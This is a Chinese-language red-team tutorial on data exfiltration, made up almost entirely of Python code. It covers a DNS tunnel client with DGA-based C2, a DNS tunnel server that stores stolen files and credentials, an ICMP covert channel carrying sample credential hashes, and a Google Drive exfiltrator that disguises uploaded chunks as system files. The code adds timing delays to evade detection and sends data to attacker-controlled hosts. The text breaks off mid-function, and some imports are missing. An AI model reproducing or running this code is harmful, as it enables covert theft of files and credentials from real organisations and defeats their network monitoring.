# 数据渗出 (Exfiltration)

## 隐蔽信道

### DNS隧道

#### DNS隧道基础实现
```python
# dns_tunnel.py
import dns.resolver
import dns.query
import dns.message
import base64
import json
import time
from datetime import datetime
import zlib

class DNSTunnel:
    def __init__(self, domain="tunnel.example.com", ns_server="8.8.8.8"):
        self.domain = domain
        self.ns_server = ns_server
        self.chunk_size = 50  # 每个DNS查询的数据大小
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = [ns_server]
    
    def encode_data(self, data):
        """编码数据"""
        # 压缩数据
        compressed = zlib.compress(data.encode('utf-8'))
        # Base64编码
        encoded = base64.b64encode(compressed).decode('utf-8')
        # 替换特殊字符
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '~')
        return encoded
    
    def decode_data(self, encoded_data):
        """解码数据"""
        # 还原特殊字符
        encoded_data = encoded_data.replace('-', '+').replace('_', '/').replace('~', '=')
        # Base64解码
        compressed = base64.b64decode(encoded_data)
        # 解压缩
        data = zlib.decompress(compressed).decode('utf-8')
        return data
    
    def split_data(self, encoded_data):
        """分割数据为DNS查询友好的块"""
        chunks = []
        for i in range(0, len(encoded_data), self.chunk_size):
            chunk = encoded_data[i:i + self.chunk_size]
            chunks.append(chunk)
        return chunks
    
    def send_data_chunk(self, chunk, sequence_number):
        """发送单个数据块"""
        # 构建DNS查询域名
        subdomain = f"{sequence_number:04d}-{chunk}"
        query_domain = f"{subdomain}.{self.domain}"
        
        try:
            # 发送DNS查询
            answer = self.resolver.resolve(query_domain, 'A')
            return True
        except dns.resolver.NXDOMAIN:
            # 域名不存在，但查询已发送
            return True
        except Exception as e:
            print(f"[!] DNS query failed: {e}")
            return False
    
    def send_data(self, data, metadata=None):
        """发送数据"""
        print(f"[*] Sending data via DNS tunnel...")
        
        # 准备数据包
        packet = {
            'timestamp': datetime.now().isoformat(),
            'data': data,
            'metadata': metadata or {},
            'size': len(data)
        }
        
        # 编码数据
        encoded_data = self.encode_data(json.dumps(packet))
        
        # 分割数据
        chunks = self.split_data(encoded_data)
        
        print(f"[*] Data encoded to {len(chunks)} chunks")
        
        # 发送每个块
        successful_chunks = 0
        for i, chunk in enumerate(chunks):
            if self.send_data_chunk(chunk, i):
                successful_chunks += 1
                print(f"[+] Sent chunk {i+1}/{len(chunks)}")
            else:
                print(f"[!] Failed to send chunk {i+1}")
            
            # 添加延迟避免检测
            time.sleep(0.5)
        
        print(f"[+] Data transmission completed: {successful_chunks}/{len(chunks)} chunks")
        return successful_chunks == len(chunks)
    
    def receive_data_chunk(self, sequence_number):
        """接收单个数据块"""
        # 这里模拟DNS响应
        # 在实际实现中，需要设置DNS服务器来接收数据
        subdomain = f"{sequence_number:04d}-response"
        query_domain = f"{subdomain}.{self.domain}"
        
        # 返回模拟数据
        return f"chunk-{sequence_number}-data"
    
    def receive_data(self, expected_chunks):
        """接收数据"""
        print(f"[*] Receiving data via DNS tunnel...")
        
        chunks = []
        for i in range(expected_chunks):
            chunk = self.receive_data_chunk(i)
            chunks.append(chunk)
            print(f"[+] Received chunk {i+1}/{expected_chunks}")
        
        # 重组数据
        encoded_data = ''.join(chunks)
        
        # 解码数据
        try:
            decoded_data = self.decode_data(encoded_data)
            packet = json.loads(decoded_data)
            return packet
        except Exception as e:
            print(f"[!] Error decoding received data: {e}")
            return None
    
    def create_dns_query_tunnel(self, data, query_type="TXT"):
        """创建DNS查询隧道"""
        encoded_data = self.encode_data(data)
        chunks = self.split_data(encoded_data)
        
        # 使用TXT记录传输数据
        if query_type == "TXT":
            responses = []
            for i, chunk in enumerate(chunks):
                subdomain = f"data-{i:04d}-{chunk}"
                query_domain = f"{subdomain}.{self.domain}"
                
                try:
                    answers = self.resolver.resolve(query_domain, 'TXT')
                    for answer in answers:
                        responses.append(str(answer).strip('"'))
                except:
                    pass
            
            return responses
        
        return []
    
    def send_file_via_dns(self, file_path, chunk_size=None):
        """通过DNS发送文件"""
        if chunk_size:
            self.chunk_size = chunk_size
        
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # 将文件数据转换为base64
            file_b64 = base64.b64encode(file_data).decode('utf-8')
            
            # 准备文件元数据
            metadata = {
                'filename': os.path.basename(file_path),
                'filesize': len(file_data),
                'chunks': len(self.split_data(file_b64))
            }
            
            # 发送数据
            success = self.send_data(file_b64, metadata)
            
            if success:
                print(f"[+] File {file_path} sent successfully via DNS tunnel")
            else:
                print(f"[!] Failed to send file {file_path}")
            
            return success
            
        except Exception as e:
            print(f"[!] Error sending file: {e}")
            return False

# 高级DNS隧道实现
class AdvancedDNSTunnel(DNSTunnel):
    def __init__(self, domain="tunnel.example.com", ns_server="8.8.8.8"):
        super().__init__(domain, ns_server)
        self.encryption_key = "secret-key-12345"
        self.compression_level = 9
    
    def encrypt_and_encode(self, data):
        """加密并编码数据"""
        # 简单XOR加密（实际应用中应使用更强的加密）
        encrypted = ""
        for i, char in enumerate(data):
            encrypted += chr(ord(char) ^ ord(self.encryption_key[i % len(self.encryption_key)]))
        
        # 压缩
        compressed = zlib.compress(encrypted.encode('utf-8'), self.compression_level)
        
        # Base64编码
        encoded = base64.b64encode(compressed).decode('utf-8')
        
        # 进一步混淆
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '~')
        
        return encoded
    
    def create_subdomain_dga(self, data, timestamp):
        """使用DGA（域名生成算法）创建子域名"""
        import hashlib
        
        # 基于时间和数据生成域名
        seed = f"{data}{timestamp}{self.encryption_key}"
        hash_value = hashlib.md5(seed.encode()).hexdigest()
        
        # 生成子域名
        subdomain_parts = []
        for i in range(0, 32, 8):
            part = hash_value[i:i+8]
            subdomain_parts.append(part)
        
        subdomain = "-".join(subdomain_parts)
        return f"{subdomain}.{self.domain}"
    
    def implement_c2_communication(self, command, response_data):
        """实现C2通信"""
        # 命令和控制通信
        command_packet = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat(),
            'response_data': response_data
        }
        
        encoded_command = self.encrypt_and_encode(json.dumps(command_packet))
        
        # 使用特定的子域名模式
        subdomain = self.create_subdomain_dga(encoded_command, datetime.now().timestamp())
        
        # 发送DNS查询
        try:
            self.resolver.resolve(subdomain, 'A')
            return True
        except:
            return False
```

#### DNS隧道服务端
```python
# dns_tunnel_server.py
import dnslib
import socket
import threading
import base64
import json
import zlib
from datetime import datetime
import sqlite3

class DNSTunnelServer:
    def __init__(self, domain="tunnel.example.com", listen_port=53):
        self.domain = domain
        self.listen_port = listen_port
        self.received_data = {}
        self.db_connection = None
        self.setup_database()
    
    def setup_database(self):
        """设置数据库"""
        self.db_connection = sqlite3.connect('dns_tunnel_data.db', check_same_thread=False)
        cursor = self.db_connection.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tunnel_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                session_id TEXT,
                sequence_number INTEGER,
                data_chunk TEXT,
                decoded_data TEXT,
                source_ip TEXT
            )
        ''')
        
        self.db_connection.commit()
    
    def decode_dns_query(self, query_name):
        """解码DNS查询"""
        try:
            # 移除域名部分
            subdomain = query_name.replace(f".{self.domain}", "")
            
            # 解析格式：seq-chunk-data
            parts = subdomain.split('-', 2)
            if len(parts) < 3:
                return None
            
            sequence_number = int(parts[0])
            chunk = parts[1]
            data = parts[2] if len(parts) > 2 else ""
            
            return {
                'sequence_number': sequence_number,
                'chunk': chunk,
                'data': data,
                'full_query': query_name
            }
            
        except Exception as e:
            print(f"[!] Error decoding DNS query: {e}")
            return None
    
    def process_dns_query(self, query_data, source_ip):
        """处理DNS查询"""
        if not query_data:
            return None
        
        session_id = f"session_{source_ip}_{datetime.now().strftime('%Y%m%d')}"
        
        # 存储数据块
        if session_id not in self.received_data:
            self.received_data[session_id] = {}
        
        self.received_data[session_id][query_data['sequence_number']] = query_data['data']
        
        # 保存到数据库
        cursor = self.db_connection.cursor()
        cursor.execute('''
            INSERT INTO tunnel_data (timestamp, session_id, sequence_number, data_chunk, source_ip)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            session_id,
            query_data['sequence_number'],
            query_data['data'],
            source_ip
        ))
        self.db_connection.commit()
        
        # 检查是否完整接收
        if self.is_session_complete(session_id):
            self.process_complete_session(session_id)
        
        return session_id
    
    def is_session_complete(self, session_id):
        """检查会话是否完整"""
        if session_id not in self.received_data:
            return False
        
        session_data = self.received_data[session_id]
        
        # 检查序列是否连续
        sequence_numbers = sorted(session_data.keys())
        
        # 检查是否有结束标记或超时
        current_time = datetime.now()
        
        # 简单的完整性检查：如果序列号连续且有一定数量
        if len(sequence_numbers) > 10:  # 假设超过10个包就是完整会话
            return True
        
        return False
    
    def process_complete_session(self, session_id):
        """处理完整会话"""
        print(f"[*] Processing complete session: {session_id}")
        
        session_data = self.received_data[session_id]
        
        # 重组数据
        sequence_numbers = sorted(session_data.keys())
        complete_data = ''.join([session_data[i] for i in sequence_numbers])
        
        # 解码数据
        try:
            # 还原特殊字符
            complete_data = complete_data.replace('-', '+').replace('_', '/').replace('~', '=')
            
            # Base64解码
            compressed_data = base64.b64decode(complete_data)
            
            # 解压缩
            json_data = zlib.decompress(compressed_data).decode('utf-8')
            
            # 解析JSON
            data_packet = json.loads(json_data)
            
            print(f"[+] Decoded data packet:")
            print(f"    Timestamp: {data_packet.get('timestamp')}")
            print(f"    Data size: {data_packet.get('size')} bytes")
            print(f"    Metadata: {data_packet.get('metadata')}")
            
            # 保存解码数据
            cursor = self.db_connection.cursor()
            cursor.execute('''
                UPDATE tunnel_data SET decoded_data = ? WHERE session_id = ?
            ''', (json_data, session_id))
            self.db_connection.commit()
            
            # 处理数据内容
            self.process_data_content(data_packet)
            
        except Exception as e:
            print(f"[!] Error processing session data: {e}")
        
        # 清理会话数据
        if session_id in self.received_data:
            del self.received_data[session_id]
    
    def process_data_content(self, data_packet):
        """处理数据内容"""
        data = data_packet.get('data', '')
        metadata = data_packet.get('metadata', {})
        
        # 检查数据类型
        if metadata.get('type') == 'file':
            self.save_exfiltrated_file(data, metadata)
        elif metadata.get('type') == 'credentials':
            self.save_exfiltrated_credentials(data, metadata)
        elif metadata.get('type') == 'command_output':
            self.save_command_output(data, metadata)
        else:
            print(f"[+] Raw data: {data[:200]}...")
    
    def save_exfiltrated_file(self, file_data, metadata):
        """保存泄露的文件"""
        filename = metadata.get('filename', f"exfiltrated_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        
        try:
            # 解码文件数据
            file_content = base64.b64decode(file_data)
            
            # 保存文件
            with open(f"exfiltrated_files/{filename}", 'wb') as f:
                f.write(file_content)
            
            print(f"[+] Exfiltrated file saved: {filename} ({len(file_content)} bytes)")
            
        except Exception as e:
            print(f"[!] Error saving exfiltrated file: {e}")
    
    def save_exfiltrated_credentials(self, cred_data, metadata):
        """保存泄露的凭证"""
        try:
            credentials = json.loads(cred_data)
            
            # 保存到专门的文件
            with open(f"exfiltrated_credentials/creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
                json.dump(credentials, f, indent=2)
            
            print(f"[+] Exfiltrated credentials saved ({len(credentials)} entries)")
            
        except Exception as e:
            print(f"[!] Error saving exfiltrated credentials: {e}")
    
    def save_command_output(self, output_data, metadata):
        """保存命令输出"""
        command = metadata.get('command', 'unknown')
        
        try:
            with open(f"command_outputs/output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", 'w') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Output:\n{output_data}\n")
            
            print(f"[+] Command output saved for: {command}")
            
        except Exception as e:
            print(f"[!] Error saving command output: {e}")
    
    def handle_dns_request(self, data, addr):
        """处理DNS请求"""
        try:
            # 解析DNS请求
            request = dnslib.DNSRecord.parse(data)
            
            # 获取查询信息
            query = request.questions[0].qname
            query_type = request.questions[0].qtype
            
            print(f"[*] DNS query from {addr[0]}:{addr[1]} - {query} ({dnslib.QTYPE[query_type]})")
            
            # 检查是否是我们的隧道域名
            if str(query).endswith(self.domain):
                # 处理隧道查询
                query_data = self.decode_dns_query(str(query))
                if query_data:
                    session_id = self.process_dns_query(query_data, addr[0])
                    print(f"[+] Processed tunnel data from {addr[0]} - Session: {session_id}")
                
                # 创建响应
                reply = request.reply()
                reply.add_answer(dnslib.RR(
                    query,
                    rtype=dnslib.QTYPE.A,
                    rdata=dnslib.A("1.1.1.1"),
                    ttl=60
                ))
                
                return reply.pack()
            else:
                # 转发查询或返回NXDOMAIN
                reply = request.reply()
                reply.header.rcode = dnslib.RCODE.NXDOMAIN
                return reply.pack()
                
        except Exception as e:
            print(f"[!] Error handling DNS request: {e}")
            return None
    
    def start_dns_server(self):
        """启动DNS服务器"""
        print(f"[*] Starting DNS tunnel server on port {self.listen_port}")
        print(f"[*] Domain: {self.domain}")
        
        # 创建必要的目录
        os.makedirs("exfiltrated_files", exist_ok=True)
        os.makedirs("exfiltrated_credentials", exist_ok=True)
        os.makedirs("command_outputs", exist_ok=True)
        
        # 创建UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', self.listen_port))
        
        print(f"[+] DNS tunnel server listening on port {self.listen_port}")
        
        try:
            while True:
                data, addr = sock.recvfrom(4096)
                
                # 处理DNS请求
                response = self.handle_dns_request(data, addr)
                
                if response:
                    sock.sendto(response, addr)
                
        except KeyboardInterrupt:
            print("\n[!] DNS server stopped by user")
        finally:
            sock.close()
            self.db_connection.close()

# 使用示例
if __name__ == "__main__":
    dns_server = DNSTunnelServer(domain="tunnel.redteam.com", listen_port=53)
    dns_server.start_dns_server()
```

### ICMP隧道

#### ICMP隧道实现
```python
# icmp_tunnel.py
import socket
import struct
import threading
import time
import base64
import json
from datetime import datetime
import zlib

class ICMPTunnel:
    def __init__(self, target_ip="192.168.1.100"):
        self.target_ip = target_ip
        self.icmp_type = 8  # Echo Request
        self.icmp_code = 0
        self.sequence_number = 0
        self.packet_id = os.getpid() & 0xFFFF
        self.buffer_size = 1024
        self.timeout = 3
    
    def calculate_checksum(self, data):
        """计算ICMP校验和"""
        # 将数据转换为16位字
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        # 处理进位
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        # 取反
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def create_icmp_packet(self, data):
        """创建ICMP数据包"""
        # ICMP头部
        icmp_header = struct.pack('!BBHHH', 
                                 self.icmp_type, 
                                 self.icmp_code, 
                                 0,  # 校验和占位符
                                 self.packet_id, 
                                 self.sequence_number)
        
        # 添加时间戳（用于计算RTT）
        timestamp = struct.pack('!d', time.time())
        
        # 组合数据包
        packet_data = icmp_header + timestamp + data
        
        # 计算校验和
        checksum = self.calculate_checksum(packet_data)
        
        # 重新创建头部，包含正确的校验和
        icmp_header = struct.pack('!BBHHH', 
                                 self.icmp_type, 
                                 self.icmp_code, 
                                 checksum,
                                 self.packet_id, 
                                 self.sequence_number)
        
        return icmp_header + timestamp + data
    
    def send_icmp_packet(self, data, sequence_number=None):
        """发送ICMP数据包"""
        if sequence_number is not None:
            self.sequence_number = sequence_number
        
        try:
            # 创建原始socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(self.timeout)
            
            # 创建ICMP数据包
            packet = self.create_icmp_packet(data)
            
            # 发送数据包
            sock.sendto(packet, (self.target_ip, 0))
            
            print(f"[+] ICMP packet sent to {self.target_ip} (seq: {self.sequence_number}, size: {len(data)} bytes)")
            
            # 接收响应（可选）
            try:
                response_data, addr = sock.recvfrom(self.buffer_size)
                print(f"[+] ICMP response received from {addr[0]}")
                return response_data
            except socket.timeout:
                print(f"[!] ICMP response timeout")
                return None
            
        except Exception as e:
            print(f"[!] Error sending ICMP packet: {e}")
            return None
        finally:
            if 'sock' in locals():
                sock.close()
            
            self.sequence_number += 1
    
    def encode_data_for_icmp(self, data):
        """编码数据用于ICMP传输"""
        # 压缩数据
        compressed = zlib.compress(data.encode('utf-8'))
        
        # Base64编码
        encoded = base64.b64encode(compressed).decode('utf-8')
        
        # 替换特殊字符
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '~')
        
        return encoded.encode('utf-8')
    
    def decode_data_from_icmp(self, encoded_data):
        """解码ICMP传输的数据"""
        try:
            # 还原特殊字符
            encoded_data = encoded_data.replace('-', '+').replace('_', '/').replace('~', '=')
            
            # Base64解码
            compressed = base64.b64decode(encoded_data)
            
            # 解压缩
            data = zlib.decompress(compressed).decode('utf-8')
            
            return data
            
        except Exception as e:
            print(f"[!] Error decoding ICMP data: {e}")
            return None
    
    def split_data_for_icmp(self, encoded_data, max_payload_size=1024):
        """分割数据以适应ICMP数据包"""
        chunks = []
        for i in range(0, len(encoded_data), max_payload_size):
            chunk = encoded_data[i:i + max_payload_size]
            chunks.append(chunk)
        return chunks
    
    def send_data_via_icmp(self, data, metadata=None):
        """通过ICMP发送数据"""
        print(f"[*] Sending data via ICMP tunnel...")
        
        # 准备数据包
        packet = {
            'timestamp': datetime.now().isoformat(),
            'data': data,
            'metadata': metadata or {},
            'size': len(data)
        }
        
        # 编码数据
        json_data = json.dumps(packet)
        encoded_data = self.encode_data_for_icmp(json_data)
        
        # 分割数据
        chunks = self.split_data_for_icmp(encoded_data)
        
        print(f"[*] Data split into {len(chunks)} ICMP packets")
        
        # 发送每个块
        successful_chunks = 0
        for i, chunk in enumerate(chunks):
            # 添加序列号信息
            chunk_with_seq = struct.pack('!H', i) + chunk
            
            response = self.send_icmp_packet(chunk_with_seq)
            
            if response:
                successful_chunks += 1
                print(f"[+] Sent chunk {i+1}/{len(chunks)} (received response)")
            else:
                print(f"[+] Sent chunk {i+1}/{len(chunks)} (no response)")
            
            # 添加延迟避免检测
            time.sleep(0.1)
        
        print(f"[+] ICMP transmission completed: {successful_chunks}/{len(chunks)} chunks")
        return successful_chunks == len(chunks)
    
    def start_icmp_listener(self, listen_port=0):
        """启动ICMP监听器"""
        print(f"[*] Starting ICMP listener...")
        
        def icmp_listener():
            try:
                # 创建原始socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                
                print(f"[+] ICMP listener started")
                
                received_chunks = {}
                
                while True:
                    try:
                        # 接收数据包
                        data, addr = sock.recvfrom(self.buffer_size)
                        
                        # 解析ICMP数据包
                        if len(data) >= 28:  # IP头部(20) + ICMP头部(8) + 数据
                            # 提取ICMP数据部分
                            icmp_data = data[28:]  # 跳过IP和ICMP头部
                            
                            if len(icmp_data) >= 2:
                                # 提取序列号
                                seq_num = struct.unpack('!H', icmp_data[:2])[0]
                                chunk_data = icmp_data[2:]
                                
                                # 存储数据块
                                if addr[0] not in received_chunks:
                                    received_chunks[addr[0]] = {}
                                
                                received_chunks[addr[0]][seq_num] = chunk_data
                                
                                print(f"[+] Received ICMP chunk from {addr[0]}: seq={seq_num}, size={len(chunk_data)}")
                                
                                # 检查是否完整接收
                                if self.is_icmp_session_complete(received_chunks[addr[0]]):
                                    self.process_icmp_session(addr[0], received_chunks[addr[0]])
                                    del received_chunks[addr[0]]
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[!] Error in ICMP listener: {e}")
                        
            except KeyboardInterrupt:
                print("\n[!] ICMP listener stopped by user")
            except Exception as e:
                print(f"[!] Error starting ICMP listener: {e}")
            finally:
                if 'sock' in locals():
                    sock.close()
        
        # 启动监听器线程
        listener_thread = threading.Thread(target=icmp_listener, daemon=True)
        listener_thread.start()
        
        return listener_thread
    
    def is_icmp_session_complete(self, chunks_dict):
        """检查ICMP会话是否完整"""
        if not chunks_dict:
            return False
        
        # 检查序列是否连续
        sequence_numbers = sorted(chunks_dict.keys())
        
        # 简单的完整性检查
        if len(sequence_numbers) > 5:  # 假设超过5个包就是完整会话
            return True
        
        # 检查是否有结束标记（可以添加特定的结束序列）
        last_chunk = chunks_dict[max(sequence_numbers)]
        if b'END' in last_chunk:
            return True
        
        return False
    
    def process_icmp_session(self, source_ip, chunks_dict):
        """处理完整的ICMP会话"""
        print(f"[*] Processing complete ICMP session from {source_ip}")
        
        # 重组数据
        sequence_numbers = sorted(chunks_dict.keys())
        complete_data = b''.join([chunks_dict[i] for i in sequence_numbers])
        
        # 解码数据
        decoded_data = self.decode_data_from_icmp(complete_data.decode('utf-8'))
        
        if decoded_data:
            try:
                packet = json.loads(decoded_data)
                print(f"[+] Decoded ICMP data packet:")
                print(f"    Timestamp: {packet.get('timestamp')}")
                print(f"    Data size: {packet.get('size')} bytes")
                print(f"    Metadata: {packet.get('metadata')}")
                
                # 保存数据
                self.save_exfiltrated_data(packet, source_ip)
                
            except Exception as e:
                print(f"[!] Error processing ICMP session data: {e}")
    
    def save_exfiltrated_data(self, data_packet, source_ip):
        """保存泄露的数据"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        try:
            # 创建必要的目录
            os.makedirs('exfiltrated_data', exist_ok=True)
            
            # 保存数据包
            filename = f"exfiltrated_data/icmp_data_{source_ip}_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(data_packet, f, indent=2)
            
            print(f"[+] Exfiltrated data saved: {filename}")
            
        except Exception as e:
            print(f"[!] Error saving exfiltrated data: {e}")
    
    def implement_icmp_covert_channel(self, command, response_data):
        """实现ICMP隐蔽信道"""
        # 创建命令和控制数据包
        command_packet = {
            'type': 'c2_command',
            'command': command,
            'response_data': response_data,
            'timestamp': datetime.now().isoformat()
        }
        
        # 编码数据
        json_data = json.dumps(command_packet)
        encoded_data = self.encode_data_for_icmp(json_data)
        
        # 分割数据
        chunks = self.split_data_for_icmp(encoded_data, max_payload_size=64)  # 较小的负载避免检测
        
        # 发送ICMP数据包
        for i, chunk in enumerate(chunks):
            # 添加序列号和伪装数据
            packet_data = struct.pack('!HH', i, len(chunks)) + chunk
            
            self.send_icmp_packet(packet_data)
            
            # 随机延迟
            time.sleep(random.uniform(0.1, 0.5))
    
    def auto_icmp_exfiltration(self):
        """自动ICMP数据渗出"""
        print("[*] Starting automatic ICMP data exfiltration...")
        
        # 启动监听器
        listener_thread = self.start_icmp_listener()
        
        # 示例：发送一些测试数据
        test_data = {
            'system_info': 'Windows 10 Enterprise',
            'user': 'Administrator',
            'domain': 'CORP.LOCAL',
            'credentials': [
                {'username': 'admin', 'hash': 'aad3b435b51404eeaad3b435b51404ee'},
                {'username': 'user1', 'hash': '8846f7eaee8fb117ad06bdd830b7586c'}
            ]
        }
        
        success = self.send_data_via_icmp(json.dumps(test_data), {
            'type': 'credentials',
            'source': 'memory_dump'
        })
        
        if success:
            print("[+] Test data exfiltration completed")
        else:
            print("[!] Test data exfiltration failed")
        
        # 保持监听器运行
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] ICMP tunnel stopped")

# 使用示例
if __name__ == "__main__":
    icmp_tunnel = ICMPTunnel(target_ip="192.168.1.100")
    icmp_tunnel.auto_icmp_exfiltration()
```

---

## Web服务利用

### 云存储API利用

#### Google Drive API利用
```python
# google_drive_exfiltration.py
import os
import json
import base64
import zlib
from datetime import datetime
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow

class GoogleDriveExfiltrator:
    def __init__(self, credentials_file="credentials.json"):
        self.credentials_file = credentials_file
        self.service = None
        self.authenticate()
    
    def authenticate(self):
        """认证Google Drive API"""
        try:
            SCOPES = ['https://www.googleapis.com/auth/drive']
            
            creds = None
            if os.path.exists('token.json'):
                creds = Credentials.from_authorized_user_file('token.json', SCOPES)
            
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    flow = InstalledAppFlow.from_client_secrets_file(
                        self.credentials_file, SCOPES)
                    creds = flow.run_local_server(port=0)
                
                with open('token.json', 'w') as token:
                    token.write(creds.to_json())
            
            self.service = build('drive', 'v3', credentials=creds)
            print("[+] Google Drive authentication successful")
            
        except Exception as e:
            print(f"[!] Google Drive authentication failed: {e}")
            self.service = None
    
    def create_folder(self, folder_name, parent_id=None):
        """创建文件夹"""
        try:
            folder_metadata = {
                'name': folder_name,
                'mimeType': 'application/vnd.google-apps.folder'
            }
            
            if parent_id:
                folder_metadata['parents'] = [parent_id]
            
            folder = self.service.files().create(body=folder_metadata, fields='id').execute()
            print(f"[+] Folder created: {folder_name} (ID: {folder.get('id')})")
            return folder.get('id')
            
        except Exception as e:
            print(f"[!] Error creating folder: {e}")
            return None
    
    def upload_file(self, file_name, file_content, mime_type='text/plain', parent_id=None):
        """上传文件"""
        try:
            # 如果内容是字符串，转换为字节
            if isinstance(file_content, str):
                file_content = file_content.encode('utf-8')
            
            # 创建文件元数据
            file_metadata = {
                'name': file_name,
                'mimeType': mime_type
            }
            
            if parent_id:
                file_metadata['parents'] = [parent_id]
            
            # 创建媒体上传
            media = MediaIoBaseUpload(
                io.BytesIO(file_content),
                mimetype=mime_type,
                resumable=True
            )
            
            # 上传文件
            file = self.service.files().create(
                body=file_metadata,
                media_body=media,
                fields='id, name, size'
            ).execute()
            
            print(f"[+] File uploaded: {file_name} (ID: {file.get('id')}, Size: {file.get('size')} bytes)")
            return file.get('id')
            
        except Exception as e:
            print(f"[!] Error uploading file: {e}")
            return None
    
    def encode_and_upload_data(self, data, filename_prefix="data"):
        """编码并上传数据"""
        try:
            # 压缩数据
            compressed = zlib.compress(data.encode('utf-8'))
            
            # Base64编码
            encoded = base64.b64encode(compressed).decode('utf-8')
            
            # 分割大文件
            chunk_size = 1024 * 1024  # 1MB chunks
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            uploaded_files = []
            
            for i, chunk in enumerate(chunks):
                filename = f"{filename_prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_part{i:03d}.txt"
                
                file_id = self.upload_file(filename, chunk)
                if file_id:
                    uploaded_files.append({
                        'filename': filename,
                        'file_id': file_id,
                        'chunk_index': i,
                        'chunk_size': len(chunk)
                    })
            
            print(f"[+] Data uploaded in {len(uploaded_files)} parts")
            return uploaded_files
            
        except Exception as e:
            print(f"[!] Error encoding and uploading data: {e}")
            return []
    
    def upload_directory(self, local_path, drive_folder_name=None):
        """上传整个目录"""
        try:
            if not os.path.exists(local_path):
                print(f"[!] Local path does not exist: {local_path}")
                return None
            
            # 创建Drive文件夹
            folder_name = drive_folder_name or os.path.basename(local_path)
            folder_id = self.create_folder(folder_name)
            
            if not folder_id:
                return None
            
            uploaded_files = []
            
            # 遍历目录
            for root, dirs, files in os.walk(local_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    try:
                        # 读取文件内容
                        with open(file_path, 'rb') as f:
                            file_content = f.read()
                        
                        # 计算相对路径
                        rel_path = os.path.relpath(file_path, local_path)
                        
                        # 上传文件
                        file_id = self.upload_file(
                            file_name=rel_path,
                            file_content=file_content,
                            parent_id=folder_id
                        )
                        
                        if file_id:
                            uploaded_files.append({
                                'local_path': file_path,
                                'drive_path': rel_path,
                                'file_id': file_id,
                                'size': len(file_content)
                            })
                        
                    except Exception as e:
                        print(f"[!] Error uploading file {file_path}: {e}")
            
            print(f"[+] Directory upload completed: {len(uploaded_files)} files")
            return {
                'folder_id': folder_id,
                'folder_name': folder_name,
                'uploaded_files': uploaded_files,
                'total_size': sum(f['size'] for f in uploaded_files)
            }
            
        except Exception as e:
            print(f"[!] Error uploading directory: {e}")
            return None
    
    def create_hidden_files(self, data, folder_name="System Files"):
        """创建隐藏文件进行数据渗出"""
        try:
            # 创建文件夹
            folder_id = self.create_folder(folder_name)
            if not folder_id:
                return None
            
            # 将数据分割并隐藏在多个文件中
            chunk_size = 50000  # 50KB chunks
            encoded_data = base64.b64encode(zlib.compress(data.encode('utf-8'))).decode('utf-8')
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            hidden_files = []
            
            for i, chunk in enumerate(chunks):
                # 生成看似随机的文件名
                import hashlib
                hash_name = hashlib.md5(f"chunk_{i}_{datetime.now().timestamp()}".encode()).hexdigest()
                
                # 伪装成系统文件
                system_names = [
                    f"thumb_{hash_name[:8]}.cache",
                    f"temp_{hash_name[8:16]}.tmp",
                    f"config_{hash_name[16:24]}.json",
                    f"data_{hash_name[24:32]}.bin"
                ]
                
                filename = system_names[i % len(system_names)]
                
                # 上传文件
                file_id = self.upload_file(
                    filename,
                    chunk,
                    mime_type='application/octet-stream',
                    parent_id=folder_id
                )
                
                if file_id:
                    hidden_files.append({
                        'filename': filename,
                        'file_id': file_id,
                        'chunk_index': i,
                        'chunk_size': len(chunk)
                    })
            
            print(f"[+] Created {len(hidden_files)} hidden files")
            return {
                'folder_id': folder_id,
                'folder_name': folder_name,
                'hidden_files': hidden_files,
                'total_chunks': len(chunks)
            }
            
        except Exception as e:
            print(f"[!] Error creating hidden files: {e}")
            return None
    
    def auto_google_drive_exfiltration(self, target_paths):
        """自动Google Drive数据渗出"""
        print("[*] Starting automatic Google Drive data exfiltration...")
        
        exfiltration_results = {
            'timestamp': datetime.now().isoformat(),
            'uploaded_files': [],
            'uploaded_directories': [],
            'hidden_files': [],
            'total_size': 0
        }
        
        for target_path in target_paths:
            print(f"\n[*] Processing: {target_path}")
            
            if os.path.isfile(target_path):
                # 上传单个文件
                try:
                    with open(target_path, 'rb') as f:
                        file_content = f.read()
                    
                    # 编码并上传
                    uploaded_files = self.encode_and_upload_data(
                        file_content.decode('utf-8', errors='ignore'),
                        filename_prefix=os.path.basename(target_path)
                    )
                    
                    exfiltration_results['uploaded_files'].extend(uploaded_files)
